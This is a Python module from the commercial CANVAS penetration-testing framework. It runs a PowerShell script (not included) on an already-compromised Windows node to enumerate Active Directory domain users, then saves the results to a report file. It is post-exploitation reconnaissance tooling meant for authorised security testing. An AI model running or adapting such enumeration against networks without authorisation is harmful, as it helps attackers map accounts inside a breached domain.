#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import socket
import locale
from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
import logging
import canvasengine

NAME                            = "ad_getdomainusers"
DESCRIPTION                     = "Obtain Users on an Active Directory Network through a PowerShell node"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION["Commandline"]    = "runmodule ad_getdomainusers"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]

DOCUMENTATION["Notes"]          = """

If the module is executed in a node that is not part of a domain it will return correctly without any output data.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.computer       = ""
        self.MaxSize        = 200
        self.adBrowser      = False
        self.genTime        = str(int(time.time()))        
        return
    
    def getargs(self):        
        self.adBrowser      = self.argsDict.get("adBrowser",self.adBrowser)
        self.MaxSize        = self.argsDict.get("MaxSize", self.MaxSize)
        
    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))
        ret = False        
        for node in self.argsDict["passednodes"]:
            self.target_ip    = node.get_interesting_interface()
            ntype = node.nodetype
            shell = node.shell
            if ntype == "PowerShellNode" or ntype in ['win32Node', 'win64Node']:
                tfile  = file_utf8_encoding( open( os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/", "getDomainUsers.ps1")), "rb").read() )
                tfile  = tfile.replace("HELLOCOMPUTER", str(self.MaxSize))
                runpow = canvasengine.getModuleExploit("runpowershellscript")
                runpow.link(self)
                runpow.argsDict["PSBuffer"]   = tfile
                runpow.argsDict["copytodisk"] = False
                runpow.argsDict["showresults"] = False
                ret = runpow.run()
                users = []
                for a in runpow.result.replace("\r\n", "").split("***"):
                    a = string.strip(a)
                    if a:
                        users += [ a.split("@##@") ] 
                if self.adBrowser == True:
                    self.result = users
                self.outputFile(users)
                logging.info ("%s users retrieved. Full results in Report directory" % str(len(users)))                
                self.setInfo("%s - done (success)" % NAME)
                return True
            else:
                logging.info("Node (%s) not supported" % ntype)
                self.setInfo("%s - done (failed)" % NAME)
            
        return ret
    
    def outputFile(self, results):
        temp = os.path.join("ADusers", (self.genTime)) 
        self.savePath = self.output(ip=self.target_ip, subdir=temp)
        #logging.info ("%s is the self savepath" % self.savePath)
        body = str(results)
        # Write the file
        fileName = "ADUsers-" + self.genTime +".txt"
        saveFile = os.path.join(self.savePath, fileName)
        #logging.info ("%s is the self saveFile" % saveFile)
        file = open(saveFile, "w")
        file.write(body)
        file.close()    
        return 0        
    
  